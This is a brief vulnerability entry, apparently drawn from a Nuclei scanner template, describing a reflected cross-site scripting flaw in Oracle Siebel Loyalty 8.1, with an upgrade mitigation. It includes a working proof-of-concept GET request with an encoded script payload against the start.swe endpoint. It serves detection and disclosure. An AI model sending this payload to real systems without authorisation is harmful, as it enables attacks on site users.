# Vulnerability: Oracle Siebel Loyalty 8.1 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`oracle-siebel-xss.yaml`)

## Description
A vulnerability in Oracle Siebel Loyalty allows remote unauthenticated attackers to inject arbitrary Javascript code into the responses returned by the '/loyalty_enu/start.swe/' endpoint.

## Secure Mitigation
Upgrade to Siebel Loyalty version 8.2 or later.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

